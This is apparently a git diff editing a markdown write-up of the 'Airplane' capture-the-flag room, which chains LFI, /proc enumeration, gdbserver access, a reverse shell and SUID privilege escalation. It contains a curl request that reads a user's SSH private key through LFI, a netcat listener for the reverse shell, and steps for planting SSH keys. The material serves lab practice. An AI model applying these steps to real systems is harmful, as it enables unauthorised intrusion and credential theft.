@@ -1,4 +1,4 @@
-### Airplane
+# Airplane
 
 This room teaches us the important penetration-testing techniques, including network enumeration, Local File Inclusion (LFI), Linux `/proc` enumeration, gdbserver exploitation, SUID privilege escalation, and sudo wildcard/path traversal.
 
@@ -36,7 +36,7 @@ We've get this three tcp ports:
 | ------ | ------------------------------ |
 | `22`   | SSH                            |
 | `6048` | Unknown service                |
-| `8000` | Flask/Werkzeug web application |
+| `8000` |  web application |
 
 We've also check that the web application has **LFI**.
 
@@ -236,13 +236,13 @@ For example:
 curl -s "http://airplane.thm:8000/?page=../../../../home/hudson/.ssh/id_rsa"
 ```
 
-These checks helped me understand the target's filesystem and application structure.
+These help me understand the target's filesystem and application structure.
 
 ---
 
 # 8. Investigating Port 6048
 
-The original Nmap scan identified:
+ Nmap scan identified:
 
 ```text
 6048/tcp
@@ -288,7 +288,7 @@ Because we already had LFI, I used the vulnerability to investigate the Linux pr
 
 Linux exposes information about running processes through the `/proc` filesystem.
 
-I investigated:
+I checked:
 
 ```text
 /proc/<PID>/cmdline
@@ -362,7 +362,7 @@ Converting:
 0x17A0 = 6048
 ```
 
-This confirmed that the process information we were investigating corresponded to the unknown service on TCP port 6048.
+This confirmed that the process information we checked corresponded to the unknown service on TCP port 6048.
 
 ---
 
@@ -426,15 +426,15 @@ The attack path was:
 
 ```text
 LFI
-  ↓
+  
 /proc enumeration
-  ↓
+  
 Identify port 6048
-  ↓
+  
 Identify gdbserver
-  ↓
+  
 Connect with GDB
-  ↓
+  
 Execute reverse-shell payload
 ```
 
@@ -489,16 +489,9 @@ Before executing the payload, I started a Netcat listener on my Kali machine:
 nc -lvnp 4444
 ```
 
-The listener was waiting for the target to connect back:
+The listener are waiting for the target to connect back:
 
-```text
-Kali
-10.x.x.x:4444
-       ↑
-       |
-       |
-Target
-```
+
 
 ---
 
@@ -571,7 +564,7 @@ Then the target downloads the binary.elf.
 
 ![Binary](./images/binary.jpg)
 
-By doing this we changed the user from hudson to Carlos, after we confirm that we are logged as carlos we inspect carlos home and we found the user.txt file and we can see the txt inside and find the flag.
+By doing this we changed the user from hudson to Carlos, after we confirm that we get inside carlos we inspect carlos home and we found the user.txt file and we can see the txt inside and find the flag.
 
 ```bash
 whoami
@@ -597,40 +590,40 @@ cat /home/carlos/user.txt
 
 Next we need to have a root privileged to find the root flag.
 
-First we will check our current privilege by running `"id"` we care only about `euid=1000(carlos)` because this is the effective identity.
+First check the current privilege by running `"id"` we care only about `euid=1000(carlos)` because this is the effective identity.
 
-We suspect that the file might be in the find program so we do:
+We guss the file might be in the find program so we do:
 
 ```bash
 ls -l /usr/bin/find
 ```
 
-We confirmed that this was a SUID program.
+We see that this was a SUID program.
 
 ```bash
 ls -la /home/carlos/.gnupg
 ```
 
-This will help us see if carlos have something interesting in his GPG configuration there was a private-key but its not usable so we generate an ssh key.
+This will help us see if carlos have something interesting to dig out in his GPG there was a private-key but its not usable so we generate an ssh key.
 
 ```bash
 ssh-keygen -t rsa
 ```
 
-The file in which the key will be saved is:
+The key file will be saved is:
 
 ```text
 /tmp/carlos_key
 ```
 
-So now two files were created:
+So now there are two files :
 
 ```text
 /tmp/carlos_key
 /tmp/carlos_key.pub
 ```
 
-The private key or the first one proves that we are allowed to log in and the public or the second one is placed in the users authorized_keys file.
+private key or the first one confirms that we are allowed to log in and public one is placed in the users authorized_keys file.
 
 
 ---
@@ -649,7 +642,7 @@ user.txt
 
 ## Root Flag
 
-Next we need to have a root privileged to find the root flag.
+Next we have to see a root privileged to find the root flag.
 
 ```text
 root.txt
@@ -659,46 +652,44 @@ root.txt
 
 ---
 
-# Attack Chain Summary
+## Summary
 
 ```text
 Nmap
-  ↓
+  
 Port 8000 discovered
-  ↓
-Flask/Werkzeug application
-  ↓
+  
 ?page=index.html
-  ↓
+  
 LFI discovered
-  ↓
+  
 /etc/passwd
-  ↓
+  
 /proc enumeration
-  ↓
+  
 Port 6048 identified
-  ↓
+  
 gdbserver identified
-  ↓
+  
 GDB connection
-  ↓
+  
 Reverse-shell payload
-  ↓
+  
 hudson shell
-  ↓
+  
 Lateral movement
-  ↓
+  
 carlos
-  ↓
+  
 user.txt
-  ↓
+  
 SUID / Privilege Escalation
-  ↓
+  
 root
-  ↓
+  
 root.txt
 ```
 
 # Conclusion
 
-This room teach us a realistic attack chain against a misconfigured system. We started with active reconnaissance using Nmap, discovered the web application, identified an LFI vulnerability, used `/proc` enumeration to identify the unknown service on port 6048, discovered gdbserver, obtained an initial shell, moved to Carlos, found the user flag, and continued with privilege escalation toward root.
+In this room i explore about a realistic attack chain against a misconfigured system. i started with active recon using Nmap, discovered the web application, identified an LFI vulnerability, used `/proc` enumeration to identify the unknown service on port 6048, discovered gdbserver, get an initial shell, moved to Carlos, found the user flag, and continue with privilege escalation toward root.
